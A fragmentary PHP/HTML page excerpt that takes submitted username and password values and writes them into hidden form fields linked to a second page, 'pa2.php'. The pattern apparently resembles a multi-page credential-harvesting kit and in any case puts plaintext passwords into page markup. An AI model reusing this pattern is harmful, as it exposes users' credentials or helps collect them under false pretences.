        ...
        <div class="banner3">
            <div class="columnas">
                <div class="columnaX">
			        ...
			        <?php 
                     $variable= $_POST['user'];
        echo '<a href="pa2.php"></a><input id="user" style="visibility:hidden" name="user" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
           <?php 
                     $variable= $_POST['pass'];
        echo '<a href="pa2.php"></a><input id="pass" style="visibility:hidden" name="pass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          <?php 
